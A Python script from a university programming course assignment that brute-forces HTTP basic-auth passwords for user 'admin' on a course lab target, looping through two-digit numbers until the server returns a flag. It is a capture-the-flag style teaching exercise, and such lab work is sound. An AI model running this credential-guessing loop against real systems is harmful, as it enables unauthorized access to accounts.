"""
INF601 - Advanced Programming in Python
Sam Boutros
Prof. Zeller
FHSU - Fall 2022
11/2/2022
https://samsclass.info/124/proj14/VP210.htm
"""

# Make a Python script that logs in to this page:
# http://target1.bowneconsulting.com/protected/A2.4
# with these parameters:
# Username: admin
# Password: a two-digit number
# User-Agent: python
# The server will reply with a flag.

import requests

# Input
url = 'http://target1.bowneconsulting.com/protected/A2.4'
username = 'admin'
headers = {'User-Agent': 'python'}

# Process, output
for password in range(99, -1, -1):
    pwd = str(password).rjust(2, '0')
    r = requests.get(url, auth=(username, pwd), headers=headers)
    if 'flag' in r.text:
        print(f"The '{username}' password is '{pwd}'")
        print(r.text)
        break
